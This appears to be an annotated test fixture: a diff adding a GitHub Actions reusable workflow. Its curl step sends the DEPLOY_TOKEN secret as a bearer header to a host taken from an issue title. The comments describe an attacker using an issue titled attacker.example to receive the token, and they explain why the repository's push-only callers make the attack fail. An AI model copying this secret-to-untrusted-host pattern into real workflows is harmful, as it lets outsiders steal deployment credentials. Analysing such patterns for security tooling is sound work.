@@ -1,0 +1,19 @@
+# situation: a reusable workflow sends a request with curl and the secret
+#   DEPLOY_TOKEN to the host github.event.issue.title names.
+# reason: no harm when every caller runs on push: the issue it reads is
+#   never an outsider's.
+# cause: a callee is read in the worst case, as if a caller ran on issues.
+# attack: the attacker opens an issue titled attacker.example, the host of a
+#   server the attacker runs.
+# attack-run-behavior: the callers in the repository run on push, whose
+#   payload has no issue, so curl sends the request to an empty host and
+#   fails.
+on: workflow_call
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - run: |
+          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ github.event.issue.title }}/status"
